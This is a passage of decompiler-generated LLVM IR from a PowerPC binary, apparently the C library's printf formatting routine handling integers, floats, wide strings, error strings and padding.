  %v3_1000bc04 = icmp eq i32 %v0_1000bbc0, 1
  br i1 %v3_1000bc04, label %dec_label_pc_1000bc20, label %dec_label_pc_1000bc10

dec_label_pc_1000bc10:                            ; preds = %dec_label_pc_1000bc04
  %v0_1000bc10 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000bc10 = mul i32 %v0_1000bc10, 4
  store i32 %v1_1000bc10, i32* %r0.global-to-local, align 4
  %v0_1000bc14 = load i32, i32* @r1, align 4
  %v2_1000bc14 = add i32 %v0_1000bc14, %v1_1000bc10
  %v1_1000bc18 = add i32 %v2_1000bc14, 188
  %v2_1000bc18 = inttoptr i32 %v1_1000bc18 to i32*
  %v3_1000bc18 = load i32, i32* %v2_1000bc18, align 4
  store i32 %v3_1000bc18, i32* %r0.global-to-local, align 4
  %v1_1000bc1c = call i32 @__asm_rlwinm(i32 %v3_1000bc18, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000bc20

dec_label_pc_1000bc20:                            ; preds = %dec_label_pc_1000bc04, %dec_label_pc_1000bc10
  %v3_1000bc20 = load i32, i32* %stack_var_-344, align 4
  %v0_1000bc24 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000bc24, i32* @r5, align 4
  %v2_1000bc28 = inttoptr i32 %v0_1000bc24 to i32*
  %v3_1000bc28 = call i32 @_load_inttype(i32 %v3_1000bc20, i32* %v2_1000bc28)
  store i32 %v0_1000bc24, i32* %r7.global-to-local, align 4
  %v0_1000bc38 = load i32, i32* %r31.global-to-local, align 4
  %v6_1000bc40 = call i32 @_uintmaxtostr(i8* %v5_1000bc40, i32 %v3_1000bc28, i32 %v3_1000bc20, i32 %v0_1000bc24, i32 %v0_1000bc38)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000bc40, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000bc94, label %dec_label_pc_1000bc54

dec_label_pc_1000bc54:                            ; preds = %dec_label_pc_1000bc20
  %v7_1000bc40 = inttoptr i32 %v6_1000bc40 to i8*
  %v3_1000bc54 = load i8, i8* %v7_1000bc40, align 1
  %v4_1000bc54 = zext i8 %v3_1000bc54 to i32
  store i32 %v4_1000bc54, i32* %r0.global-to-local, align 4
  %v3_1000bc5c = icmp eq i8 %v3_1000bc54, 45
  br i1 %v3_1000bc5c, label %dec_label_pc_1000bc64, label %dec_label_pc_1000bc78

dec_label_pc_1000bc64:                            ; preds = %dec_label_pc_1000bc54
  %v1_1000bc64 = or i32 %v0_1000bc88, 2
  store i32 %v1_1000bc64, i32* %r0.global-to-local, align 4
  %v2_1000bc68 = add i32 %v6_1000bc40, 1
  store i32 %v2_1000bc68, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000bc94

dec_label_pc_1000bc78:                            ; preds = %dec_label_pc_1000bc54
  %v1_1000bc78 = and i32 %v0_1000bc88, 2
  store i32 %v1_1000bc78, i32* %r0.global-to-local, align 4
  %v3_1000bc78 = icmp eq i32 %v1_1000bc78, 0
  br i1 %v3_1000bc78, label %dec_label_pc_1000bc88, label %dec_label_pc_1000bc80

dec_label_pc_1000bc80:                            ; preds = %dec_label_pc_1000bc78
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000bc94

dec_label_pc_1000bc88:                            ; preds = %dec_label_pc_1000bc78
  %v1_1000bc88 = urem i32 %v0_1000bc88, 2
  store i32 %v1_1000bc88, i32* %r11.global-to-local, align 4
  %v3_1000bc88 = icmp eq i32 %v1_1000bc88, 0
  br i1 %v3_1000bc88, label %dec_label_pc_1000bc94, label %dec_label_pc_1000bc90

dec_label_pc_1000bc90:                            ; preds = %dec_label_pc_1000bc88
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000bc94

dec_label_pc_1000bc94:                            ; preds = %dec_label_pc_1000bc88, %dec_label_pc_1000bc20, %dec_label_pc_1000bc80, %dec_label_pc_1000bc64, %dec_label_pc_1000bc90
  %v0_1000bd00 = phi i32 [ %v6_1000bc40, %dec_label_pc_1000bc20 ], [ %v2_1000bc68, %dec_label_pc_1000bc64 ], [ %v6_1000bc40, %dec_label_pc_1000bc88 ], [ %v6_1000bc40, %dec_label_pc_1000bc90 ], [ %v6_1000bc40, %dec_label_pc_1000bc80 ]
  %stack_var_-184.0 = phi i32 [ %v0_1000bc88, %dec_label_pc_1000bc20 ], [ %v1_1000bc64, %dec_label_pc_1000bc64 ], [ %v0_1000bc88, %dec_label_pc_1000bc88 ], [ %v0_1000bc88, %dec_label_pc_1000bc90 ], [ %v0_1000bc88, %dec_label_pc_1000bc80 ]
  %v3_1000bc94 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000bea8, i32* %r0.global-to-local, align 4
  %v2_1000bc9c = sub i32 %v2_1000bea8, %v0_1000bd00
  %v1_1000bca4 = add i32 %v2_1000bc9c, 127
  store i32 %v1_1000bca4, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000bc94, -1
  br i1 %tmp76, label %dec_label_pc_1000bcb0, label %dec_label_pc_1000bcac

dec_label_pc_1000bcac:                            ; preds = %dec_label_pc_1000bc94
  br label %dec_label_pc_1000bcb0

dec_label_pc_1000bcb0:                            ; preds = %dec_label_pc_1000bc94, %dec_label_pc_1000bcac
  %v0_1000bce4 = phi i32 [ %v3_1000bc94, %dec_label_pc_1000bc94 ], [ 1, %dec_label_pc_1000bcac ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000bcb4 = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000bcb4, i32* %r11.global-to-local, align 4
  %v3_1000bcb4 = icmp eq i32 %v1_1000bcb4, 0
  br i1 %v3_1000bcb4, label %dec_label_pc_1000bd00, label %dec_label_pc_1000bcbc

dec_label_pc_1000bcbc:                            ; preds = %dec_label_pc_1000bcb0
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000bcc0, label %dec_label_pc_1000bccc, label %dec_label_pc_1000bcdc.thread

dec_label_pc_1000bcdc.thread:                     ; preds = %dec_label_pc_1000bcbc
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000bd00

dec_label_pc_1000bccc:                            ; preds = %dec_label_pc_1000bcbc
  br i1 %v3_1000bccc, label %dec_label_pc_1000bcd4, label %dec_label_pc_1000bcdc

dec_label_pc_1000bcd4:                            ; preds = %dec_label_pc_1000bccc
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000bd00

dec_label_pc_1000bcdc:                            ; preds = %dec_label_pc_1000bccc
  br i1 %v3_1000bcdc, label %dec_label_pc_1000bce4, label %dec_label_pc_1000bd00

dec_label_pc_1000bce4:                            ; preds = %dec_label_pc_1000bcdc
  %v3_1000bce4 = icmp ugt i32 %v0_1000bce4, %v1_1000bca4
  br i1 %v3_1000bce4, label %dec_label_pc_1000bd00, label %dec_label_pc_1000bcec

dec_label_pc_1000bcec:                            ; preds = %dec_label_pc_1000bce4
  %v1_1000bcec = inttoptr i32 %v0_1000bd00 to i8*
  %v2_1000bcec = load i8, i8* %v1_1000bcec, align 1
  %v3_1000bcec = zext i8 %v2_1000bcec to i32
  store i32 %v3_1000bcec, i32* %r0.global-to-local, align 4
  %v3_1000bcf4 = icmp eq i8 %v2_1000bcec, 48
  br i1 %v3_1000bcf4, label %dec_label_pc_1000bd00, label %dec_label_pc_1000bcfc

dec_label_pc_1000bcfc:                            ; preds = %dec_label_pc_1000bcec
  %v1_1000bcfc = add i32 %v2_1000bc9c, 128
  br label %dec_label_pc_1000bd00

dec_label_pc_1000bd00:                            ; preds = %dec_label_pc_1000bcdc.thread, %dec_label_pc_1000bcdc, %dec_label_pc_1000bcec, %dec_label_pc_1000bce4, %dec_label_pc_1000bcb0, %dec_label_pc_1000bcd4, %dec_label_pc_1000bcfc
  %v1_1000bd48 = phi i32 [ %v0_1000bce4, %dec_label_pc_1000bcdc ], [ 1, %dec_label_pc_1000bcec ], [ %v0_1000bce4, %dec_label_pc_1000bce4 ], [ %v0_1000bce4, %dec_label_pc_1000bcb0 ], [ %v0_1000bce4, %dec_label_pc_1000bcd4 ], [ %v1_1000bcfc, %dec_label_pc_1000bcfc ], [ %v0_1000bce4, %dec_label_pc_1000bcdc.thread ]
  %v1_1000bd00 = inttoptr i32 %v0_1000bd00 to i8*
  %v2_1000bd00 = load i8, i8* %v1_1000bd00, align 1
  %v3_1000bd00 = zext i8 %v2_1000bd00 to i32
  store i32 %v3_1000bd00, i32* %r0.global-to-local, align 4
  %v3_1000bd04 = icmp eq i8 %v2_1000bd00, 48
  br i1 %v3_1000bd04, label %dec_label_pc_1000bd0c, label %dec_label_pc_1000bd44

dec_label_pc_1000bd0c:                            ; preds = %dec_label_pc_1000bd00
  %v0_1000bd0c = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1000bd0c, 6
  br i1 %tmp77, label %dec_label_pc_1000bd18, label %dec_label_pc_1000bd14

dec_label_pc_1000bd14:                            ; preds = %dec_label_pc_1000bd0c
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000bd18

dec_label_pc_1000bd18:                            ; preds = %dec_label_pc_1000bd0c, %dec_label_pc_1000bd14
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000bd1c, label %dec_label_pc_1000bd24, label %dec_label_pc_1000bd34

dec_label_pc_1000bd24:                            ; preds = %dec_label_pc_1000bd18
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10018c98.396 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bec0

dec_label_pc_1000bd34:                            ; preds = %dec_label_pc_1000bd18
  %v3_1000bd34 = icmp eq i32 %v1_1000bd48, 0
  br i1 %v3_1000bd34, label %dec_label_pc_1000bd3c, label %dec_label_pc_1000bd44

dec_label_pc_1000bd3c:                            ; preds = %dec_label_pc_1000bd34
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bec0

dec_label_pc_1000bd44:                            ; preds = %dec_label_pc_1000bd34, %dec_label_pc_1000bd00
  %v3_1000bd44 = icmp ugt i32 %v1_1000bd48, %v1_1000bca4
  %v2_1000bd48 = sub i32 %v1_1000bd48, %v1_1000bca4
  store i32 %v2_1000bd48, i32* %r29.global-to-local, align 4
  br i1 %v3_1000bd44, label %dec_label_pc_1000bee0thread-pre-split, label %dec_label_pc_1000bec0

dec_label_pc_1000bd54:                            ; preds = %dec_label_pc_1000bb74
  br i1 %v2_1000bd54, label %dec_label_pc_1000bd88, label %dec_label_pc_1000bd5c

dec_label_pc_1000bd5c:                            ; preds = %dec_label_pc_1000bd54
  %v3_1000bd5c = load i32, i32* %stack_var_-344, align 4
  %v0_1000bd68 = load i32, i32* %r24.global-to-local, align 4
  store i32 268483960, i32* @lr, align 4
  %v5_1000bd74 = call i32 @_fpmaxtostr(i32 %v0_1000bd68, i32* nonnull %stack_var_-196, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -18096), i32 %v3_1000bd5c)
  %v1_1000bd78 = icmp slt i32 %v5_1000bd74, 0
  br i1 %v1_1000bd78, label %dec_label_pc_1000c044, label %dec_label_pc_1000bd80

dec_label_pc_1000bd80:                            ; preds = %dec_label_pc_1000bd5c
  %v0_1000bd80 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000bd80 = add i32 %v0_1000bd80, %v5_1000bd74
  store i32 %v2_1000bd80, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000c030

dec_label_pc_1000bd88:                            ; preds = %dec_label_pc_1000bd54
  br i1 %v2_1000bd88, label %dec_label_pc_1000be30, label %dec_label_pc_1000bd90

dec_label_pc_1000bd90:                            ; preds = %dec_label_pc_1000bd88
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000bd9c = load i32, i32* %stack_var_-344, align 4
  %v1_1000bda4 = inttoptr i32 %v3_1000bd9c to i32*
  %v2_1000bda4 = load i32, i32* %v1_1000bda4, align 4
  br i1 %v3_1000bd88, label %dec_label_pc_1000bda4, label %dec_label_pc_1000bdf8

dec_label_pc_1000bda4:                            ; preds = %dec_label_pc_1000bd90
  store i32 %v2_1000bda4, i32* %r0.global-to-local, align 4
  %v3_1000bda8 = icmp eq i32 %v2_1000bda4, 0
  store i32 %v2_1000bda4, i32* %stack_var_-340, align 4
  br i1 %v3_1000bda8, label %dec_label_pc_1000bec8, label %dec_label_pc_1000bdb4

dec_label_pc_1000bdb4:                            ; preds = %dec_label_pc_1000bda4
  %v3_1000bdb4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000bdb4, i32* %r0.global-to-local, align 4
  %v1_1000bdbc = icmp slt i32 %v3_1000bdb4, 0
  br i1 %v1_1000bdbc, label %dec_label_pc_1000bdc8, label %dec_label_pc_1000bdc4

dec_label_pc_1000bdc4:                            ; preds = %dec_label_pc_1000bdb4
  br label %dec_label_pc_1000bdc8

dec_label_pc_1000bdc8:                            ; preds = %dec_label_pc_1000bdb4, %dec_label_pc_1000bdc4
  %storemerge94 = phi i32 [ %v3_1000bdb4, %dec_label_pc_1000bdc4 ], [ -1, %dec_label_pc_1000bdb4 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000bdc8, i32* @r3, align 4
  store i32 %v2_1000bdcc, i32* @r6, align 4
  store i32 %v2_1000bdc8, i32* @r4, align 4
  store i32 268484056, i32* @lr, align 4
  %v0_1000bdd4 = call i32 @__GI_wcsrtombs()
  %v3_1000bdd8 = icmp eq i32 %v0_1000bdd4, -1
  store i32 %v0_1000bdd4, i32* @r31, align 4
  br i1 %v3_1000bdd8, label %dec_label_pc_1000c044, label %dec_label_pc_1000bde4

dec_label_pc_1000bde4:                            ; preds = %dec_label_pc_1000bdc8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bee0

dec_label_pc_1000bdf8:                            ; preds = %dec_label_pc_1000bd90
  store i32 %v2_1000bea8, i32* @r28, align 4
  store i32 268484108, i32* @lr, align 4
  %v3_1000be08 = call i32 @__GI_wcrtomb(i32 %v2_1000bea8, i32 %v2_1000bda4, i32 %v2_1000bdcc)
  %v3_1000be0c = icmp eq i32 %v3_1000be08, -1
  store i32 %v3_1000be08, i32* @r31, align 4
  br i1 %v3_1000be0c, label %dec_label_pc_1000c044, label %dec_label_pc_1000be18

dec_label_pc_1000be18:                            ; preds = %dec_label_pc_1000bdf8
  store i32 %v2_1000bea8, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000be28 = load i32, i32* @r25, align 4
  %v1_1000be28 = load i32, i32* @r28, align 4
  %v3_1000be28 = trunc i32 %v0_1000be28 to i8
  %v4_1000be28 = add i32 %v1_1000be28, %v3_1000be08
  %v5_1000be28 = inttoptr i32 %v4_1000be28 to i8*
  store i8 %v3_1000be28, i8* %v5_1000be28, align 1
  %v0_1000bee4.pre.pre = load i32, i32* @r31, align 4
  %v1_1000bee4.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000bee0thread-pre-split

dec_label_pc_1000be30:                            ; preds = %dec_label_pc_1000bd88
  br i1 %v2_1000be30, label %dec_label_pc_1000be9c, label %dec_label_pc_1000be38

dec_label_pc_1000be38:                            ; preds = %dec_label_pc_1000be30
  %v3_1000be3c = load i32, i32* %stack_var_-344, align 4
  %v1_1000be44 = inttoptr i32 %v3_1000be3c to i32*
  %v2_1000be44 = load i32, i32* %v1_1000be44, align 4
  br i1 %v3_1000be30, label %dec_label_pc_1000be44, label %dec_label_pc_1000be74

dec_label_pc_1000be44:                            ; preds = %dec_label_pc_1000be38
  store i32 %v2_1000be44, i32* %r30.global-to-local, align 4
  %v3_1000be48 = icmp eq i32 %v2_1000be44, 0
  br i1 %v3_1000be48, label %dec_label_pc_1000bec8, label %dec_label_pc_1000be50

dec_label_pc_1000be50:                            ; preds = %dec_label_pc_1000be44, %dec_label_pc_1000bea4
  %v0_1000be64 = phi i32 [ %v2_1000be44, %dec_label_pc_1000be44 ], [ %v3_1000beb4, %dec_label_pc_1000bea4 ]
  %v3_1000be50 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000be50, i32* %r0.global-to-local, align 4
  %v1_1000be58 = icmp slt i32 %v3_1000be50, 0
  br i1 %v1_1000be58, label %dec_label_pc_1000be64, label %dec_label_pc_1000be60

dec_label_pc_1000be60:                            ; preds = %dec_label_pc_1000be50
  br label %dec_label_pc_1000be64

dec_label_pc_1000be64:                            ; preds = %dec_label_pc_1000be50, %dec_label_pc_1000be60
  %storemerge95 = phi i32 [ %v3_1000be50, %dec_label_pc_1000be60 ], [ -1, %dec_label_pc_1000be50 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268484204, i32* @lr, align 4
  %v1_1000be68 = inttoptr i32 %v0_1000be64 to i8*
  %v2_1000be68 = call i32 @strnlen(i8* %v1_1000be68)
  store i32 %v2_1000be68, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bed4

dec_label_pc_1000be74:                            ; preds = %dec_label_pc_1000be38
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1000be44, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000bea8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bee0thread-pre-split

dec_label_pc_1000be9c:                            ; preds = %dec_label_pc_1000be30
  br i1 %v3_1000be9c, label %dec_label_pc_1000bea4, label %dec_label_pc_1000c044

dec_label_pc_1000bea4:                            ; preds = %dec_label_pc_1000be9c
  %v0_1000bea4 = call i32 @__errno_location()
  %v1_1000beac = inttoptr i32 %v0_1000bea4 to i32*
  %v2_1000beac = load i32, i32* %v1_1000beac, align 4
  store i32 %v2_1000beac, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268484280, i32* @lr, align 4
  %v3_1000beb4 = call i32 @__GI___glibc_strerror_r(i32 %v2_1000beac, i32 %v2_1000bea8, i32 128)
  store i32 %v3_1000beb4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000be50

dec_label_pc_1000bec0:                            ; preds = %dec_label_pc_1000bd44, %dec_label_pc_1000bd3c, %dec_label_pc_1000bd24
  %v0_1000bee4.pre41 = phi i32 [ %v1_1000bca4, %dec_label_pc_1000bd44 ], [ 0, %dec_label_pc_1000bd3c ], [ 5, %dec_label_pc_1000bd24 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000bee0thread-pre-split

dec_label_pc_1000bec8:                            ; preds = %dec_label_pc_1000be44, %dec_label_pc_1000bda4
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10018ca0.397 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bed4

dec_label_pc_1000bed4:                            ; preds = %dec_label_pc_1000be64, %dec_label_pc_1000bec8
  %v0_1000bee429 = phi i32 [ %v2_1000be68, %dec_label_pc_1000be64 ], [ 6, %dec_label_pc_1000bec8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000bee0

dec_label_pc_1000bee0thread-pre-split:            ; preds = %dec_label_pc_1000be18, %dec_label_pc_1000be74, %dec_label_pc_1000bec0, %dec_label_pc_1000bd44
  %v1_1000bee4.pre = phi i32 [ %v2_1000bd48, %dec_label_pc_1000bd44 ], [ 0, %dec_label_pc_1000bec0 ], [ %v1_1000bee4.pre.pre, %dec_label_pc_1000be18 ], [ 0, %dec_label_pc_1000be74 ]
  %v0_1000bee4.pre = phi i32 [ %v1_1000bca4, %dec_label_pc_1000bd44 ], [ %v0_1000bee4.pre41, %dec_label_pc_1000bec0 ], [ %v0_1000bee4.pre.pre, %dec_label_pc_1000be18 ], [ 1, %dec_label_pc_1000be74 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000bd44 ], [ %stack_var_-184.0, %dec_label_pc_1000bec0 ], [ %v0_1000bc88, %dec_label_pc_1000be18 ], [ %v0_1000bc88, %dec_label_pc_1000be74 ]
  %v0_1000bee0.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000bee0

dec_label_pc_1000bee0:                            ; preds = %dec_label_pc_1000bee0thread-pre-split, %dec_label_pc_1000bde4, %dec_label_pc_1000bed4
  %v1_1000bee4 = phi i32 [ %v1_1000bee4.pre, %dec_label_pc_1000bee0thread-pre-split ], [ 0, %dec_label_pc_1000bde4 ], [ 0, %dec_label_pc_1000bed4 ]
  %v0_1000bee4 = phi i32 [ %v0_1000bee4.pre, %dec_label_pc_1000bee0thread-pre-split ], [ %v0_1000bdd4, %dec_label_pc_1000bde4 ], [ %v0_1000bee429, %dec_label_pc_1000bed4 ]
  %v0_1000beec = phi i32 [ %v0_1000bee0.pr, %dec_label_pc_1000bee0thread-pre-split ], [ 11, %dec_label_pc_1000bde4 ], [ 11, %dec_label_pc_1000bed4 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000bee0thread-pre-split ], [ %v0_1000bc88, %dec_label_pc_1000bde4 ], [ %v0_1000bc88, %dec_label_pc_1000bed4 ]
  %v3_1000bee0 = icmp eq i32 %v0_1000beec, 11
  %v2_1000bee4 = add i32 %v0_1000bee4, %v1_1000bee4
  store i32 %v2_1000bee4, i32* %r0.global-to-local, align 4
  br i1 %v3_1000bee0, label %dec_label_pc_1000bf00, label %dec_label_pc_1000beec

dec_label_pc_1000beec:                            ; preds = %dec_label_pc_1000bee0
  %v0_1000bef0 = call i32 @__asm_mfcr()
  %v1_1000bef4 = call i32 @__asm_rlwinm(i32 %v0_1000bef0, i32 30, i32 31, i32 31)
  %v1_1000bef8 = add i32 %v1_1000bef4, 1
  %v0_1000befc = load i32, i32* %r0.global-to-local, align 4
  %v2_1000befc = add i32 %v0_1000befc, %v1_1000bef8
  store i32 %v2_1000befc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000bf00

dec_label_pc_1000bf00:                            ; preds = %dec_label_pc_1000bee0, %dec_label_pc_1000beec
  %v0_1000bf18 = phi i32 [ %v2_1000bee4, %dec_label_pc_1000bee0 ], [ %v2_1000befc, %dec_label_pc_1000beec ]
  %v3_1000bf08 = icmp ugt i32 %tmp, %v0_1000bf18
  br i1 %v3_1000bf08, label %dec_label_pc_1000bf10, label %dec_label_pc_1000bf14

dec_label_pc_1000bf10:                            ; preds = %dec_label_pc_1000bf00
  %v2_1000bf10 = sub i32 %tmp, %v0_1000bf18
  br label %dec_label_pc_1000bf14

dec_label_pc_1000bf14:                            ; preds = %dec_label_pc_1000bf00, %dec_label_pc_1000bf10
  %storemerge93 = phi i32 [ %v2_1000bf10, %dec_label_pc_1000bf10 ], [ 0, %dec_label_pc_1000bf00 ]
  %v1_1000bf24 = phi i32 [ %v2_1000bf10, %dec_label_pc_1000bf10 ], [ 0, %dec_label_pc_1000bf00 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1000bf14 = load i32, i32* @r26, align 4
  %v3_1000bf14 = icmp eq i32 %v0_1000bf14, 48
  %v2_1000bf18 = add i32 %v1_1000bf24, %v0_1000bf18
  store i32 %v2_1000bf18, i32* %r0.global-to-local, align 4
  %v0_1000bf1c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000bf1c = add i32 %v0_1000bf1c, %v2_1000bf18
  store i32 %v2_1000bf1c, i32* %r23.global-to-local, align 4
  br i1 %v3_1000bf14, label %dec_label_pc_1000bf24, label %dec_label_pc_1000bf2c

dec_label_pc_1000bf24:                            ; preds = %dec_label_pc_1000bf14
  %v0_1000bf24 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000bf24 = add i32 %v0_1000bf24, %v1_1000bf24
  store i32 %v2_1000bf24, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000bf2c

dec_label_pc_1000bf2c:                            ; preds = %dec_label_pc_1000bf14, %dec_label_pc_1000bf24
  %v0_1000bf40 = phi i32 [ %v1_1000bf24, %dec_label_pc_1000bf14 ], [ 0, %dec_label_pc_1000bf24 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000bf30 = and i32 %stack_var_-184.1, 8
  %v3_1000bf30 = icmp eq i32 %v1_1000bf30, 0
  br i1 %v3_1000bf30, label %dec_label_pc_1000bf38, label %dec_label_pc_1000bf54

dec_label_pc_1000bf38:                            ; preds = %dec_label_pc_1000bf2c
  %v0_1000bf38 = load i32, i32* %r24.global-to-local, align 4
  store i32 268484424, i32* @lr, align 4
  %v4_1000bf44 = call i32 @_charpad(i32 %v0_1000bf38, i8 32, i32 %v0_1000bf40)
  %v1_1000bf48 = load i32, i32* @r28, align 4
  %v4_1000bf48 = icmp eq i32 %v4_1000bf44, %v1_1000bf48
  br i1 %v4_1000bf48, label %dec_label_pc_1000bf50, label %dec_label_pc_1000c044

dec_label_pc_1000bf50:                            ; preds = %dec_label_pc_1000bf38
  br label %dec_label_pc_1000bf54

dec_label_pc_1000bf54:                            ; preds = %dec_label_pc_1000bf2c, %dec_label_pc_1000bf50
  %v0_1000bf58 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000bf60 = load i32, i32* @r27, align 4
  %v2_1000bf60 = add i32 %v0_1000bf60, ptrtoint (i32* @global_var_10018ca8.398 to i32)
  store i32 268484456, i32* @lr, align 4
  %v2_1000bf64 = call i32 @__GI_fputs_unlocked(i32 %v2_1000bf60, i32 %v0_1000bf58)
  %v0_1000bf70 = load i32, i32* @r29, align 4
  store i32 268484472, i32* @lr, align 4
  %v4_1000bf74 = call i32 @_charpad(i32 %v0_1000bf58, i8 48, i32 %v0_1000bf70)
  %v1_1000bf78 = load i32, i32* @r29, align 4
  %v4_1000bf78 = icmp eq i32 %v4_1000bf74, %v1_1000bf78
  br i1 %v4_1000bf78, label %dec_label_pc_1000bf80, label %dec_label_pc_1000c044

dec_label_pc_1000bf80:                            ; preds = %dec_label_pc_1000bf54
  %v3_1000bf80 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000bf80, i32* %r0.global-to-local, align 4
  %v3_1000bf84 = icmp eq i32 %v3_1000bf80, 0
  br i1 %v3_1000bf84, label %dec_label_pc_1000bf8c, label %dec_label_pc_1000bfb4

dec_label_pc_1000bf8c:                            ; preds = %dec_label_pc_1000bf80
  %v0_1000bf8c = load i32, i32* @r31, align 4
  %v3_1000bf8c = icmp eq i32 %v0_1000bf8c, 0
  br i1 %v3_1000bf8c, label %dec_label_pc_1000bfa8.thread, label %dec_label_pc_1000bfa8

dec_label_pc_1000bfa8.thread:                     ; preds = %dec_label_pc_1000bf8c
  br label %dec_label_pc_1000c018

dec_label_pc_1000bfa8:                            ; preds = %dec_label_pc_1000bf8c
  %v0_1000bf98 = load i32, i32* @r30, align 4
  %v0_1000bfa0 = load i32, i32* %r24.global-to-local, align 4
  store i32 268484520, i32* @lr, align 4
  %v4_1000bfa4 = inttoptr i32 %v0_1000bfa0 to i16*
  %v5_1000bfa4 = call i32 @__stdio_fwrite(i32 %v0_1000bf98, i32 %v0_1000bf8c, i16* %v4_1000bfa4)
  %v1_1000bfa8.pre = load i32, i32* @r31, align 4
  %v4_1000bfa8 = icmp eq i32 %v5_1000bfa4, %v1_1000bfa8.pre
  br i1 %v4_1000bfa8, label %dec_label_pc_1000c018, label %dec_label_pc_1000c044

dec_label_pc_1000bfb4:                            ; preds = %dec_label_pc_1000bf80
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000bff8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bff8

dec_label_pc_1000bfc0:                            ; preds = %dec_label_pc_1000bff8
  %tmp78 = icmp ult i32 %v0_1000c010, 129
  br i1 %tmp78, label %dec_label_pc_1000bfc8, label %dec_label_pc_1000bfc4

dec_label_pc_1000bfc4:                            ; preds = %dec_label_pc_1000bfc0
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000bfc8

dec_label_pc_1000bfc8:                            ; preds = %dec_label_pc_1000bfc0, %dec_label_pc_1000bfc4
  store i32 ptrtoint (i32* @global_var_1000bfcc.399 to i32), i32* @lr, align 4
  %v0_1000bfc8 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000bfc8, i32* @r30, align 4
  %v3_1000bfd0 = icmp eq i32 %v0_1000bfc8, 0
  br i1 %v3_1000bfd0, label %dec_label_pc_1000bfec, label %dec_label_pc_1000bfe4

dec_label_pc_1000bfe4:                            ; preds = %dec_label_pc_1000bfc8
  %v0_1000bfd4 = load i32, i32* %r24.global-to-local, align 4
  store i32 268484584, i32* @lr, align 4
  %v3_1000bfe4 = inttoptr i32 %v0_1000bfd4 to i16*
  %v4_1000bfe4 = call i32 @__stdio_fwrite(i32 %v2_1000bea8, i32 %v0_1000bfc8, i16* %v3_1000bfe4)
  store i32 %v4_1000bfe4, i32* %r0.global-to-local, align 4
  %v1_1000bfec.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000bfec

dec_label_pc_1000bfec:                            ; preds = %dec_label_pc_1000bfc8, %dec_label_pc_1000bfe4
